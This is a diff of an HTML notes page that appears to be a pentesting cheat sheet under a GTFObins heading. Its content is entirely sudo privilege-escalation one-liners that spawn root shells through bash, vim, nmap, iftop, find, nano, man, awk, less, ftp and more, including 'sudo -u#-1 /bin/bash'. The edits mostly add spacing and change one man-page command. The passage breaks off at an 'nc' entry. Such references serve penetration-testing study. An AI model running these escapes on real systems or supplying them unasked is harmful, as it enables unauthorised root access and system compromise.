@@ -184,41 +184,52 @@ GTFObins <li>https://gtfobins.github.io/</li>
 <h2>GTFObins</h2>
 
 bash
+
 <code>sudo -u#-1 /bin/bash</code>
 
 <code>sudo bash -p</code>
 
 vim 
+
 <code>sudo vim</code> followed by <code>:!bash -p</code> ( -p flag make the progrom persist the root permision)
 
 nmap
+
 <code>sudo nmap --interactive</code> followed by <code>!sh</code>
 
 iftop
+
 <code>sudo iftop</code> followed by <b>shift+!</b> and Command> <code>/bin/sh</code>
 
 find
+
 <code>sudo find . -exec /bin/sh \; -quit</code>
 
 
 nano
+
 <code>sudo nano</code> The Press <b>"CTRL+R CTRL+X"</b><code>reset sh 1>&0 2>&0</code> Can edit the sudoers file
 
 man
-<code>sudo man</code>followed by <code>!/bin/sh</code>
+
+<code>sudo man man </code>followed by <code>!/bin/sh</code>
 
 awk
+
 <code>sudo awk 'BEGIN {system("/bin/sh")}'</code>
 
 less
+
 <code>sudo less /etc/profile followed by !/bin/sh</code>
 
 <code>sudo less</code> : <code>!/bin/sh -p</code> ( -p flag make the progrom persist the root permision)
 
 ftp
+
 <code>sudo ftp</code>followed by <code>!/bin/sh</code>
 
 more
+
 <code>TERM= sudo more /etc/profile</code> followed by <code>!/bin/sh</code>
 
 nc
